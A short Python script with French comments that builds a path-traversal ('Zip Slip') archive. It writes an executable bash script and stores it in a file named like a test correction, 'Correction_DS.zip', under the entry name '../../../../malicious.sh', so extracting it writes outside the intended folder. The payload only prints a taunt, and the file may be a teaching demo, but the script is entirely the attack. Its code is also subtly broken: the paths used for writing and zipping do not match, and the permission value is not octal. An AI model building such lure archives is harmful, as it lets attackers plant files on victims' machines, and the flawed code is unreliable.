import zipfile
import os

# Créer un répertoire temporaire pour le fichier à zipper
os.makedirs('.evil', exist_ok=True)


#Chemin du programme
vulnerable_path = '../../../../malicious.sh'

# Créer un script Bash malveillant
with open(vulnerable_path, 'w') as f:
    f.write("#!/bin/bash\n")
    f.write('echo \"Ahahah je t\'ai bien eu !\"')

# Rendre le script exécutable
os.chmod('.evil/'+vulnerable_path, 777)

# Créer le fichier ZIP avec le script piégé
with zipfile.ZipFile('Correction_DS.zip', 'w') as zipf:
    zipf.write('.evil/'+vulnerable_path, arcname=vulnerable_path)

print("Fichier ZIP créé")